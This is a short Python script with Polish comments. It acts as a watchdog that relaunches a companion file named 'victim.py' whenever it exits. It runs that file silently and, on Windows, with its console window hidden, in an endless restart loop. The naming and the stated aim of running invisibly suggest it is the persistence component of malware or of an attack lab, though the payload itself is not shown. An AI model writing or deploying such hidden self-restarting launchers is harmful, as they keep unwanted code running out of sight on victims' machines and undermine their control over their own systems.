"""
Watchdog — pilnuje żeby victim.py zawsze działał.
Jeśli proces padnie, automatycznie go restartuje.
Działa w tle, niewidocznie.
"""
import subprocess
import sys
import os
import time
import platform

# Ścieżka do victim.py (obok watchdoga)
VICTIM_SCRIPT = os.path.join(os.path.dirname(os.path.abspath(__file__)), "victim.py")
RESTART_DELAY = 3  # sekundy przed restartem po crashu
PYTHON = sys.executable  # ten sam interpreter co watchdog


def run_victim():
    """Uruchamia victim.py jako ukryty subprocess i czeka aż się zakończy."""
    kwargs = dict(
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
        stdin=subprocess.DEVNULL,
    )

    # Na Windows — bez okna
    if platform.system() == "Windows":
        kwargs["creationflags"] = 0x08000000  # CREATE_NO_WINDOW
        si = subprocess.STARTUPINFO()
        si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        si.wShowWindow = 0
        kwargs["startupinfo"] = si

    proc = subprocess.Popen([PYTHON, VICTIM_SCRIPT], **kwargs)
    proc.wait()  # blokuje aż victim się zakończy
    return proc.returncode


def main():
    """Pętla watchdoga — restartuje victima w nieskończoność."""
    while True:
        run_victim()
        time.sleep(RESTART_DELAY)


if __name__ == "__main__":
    main()
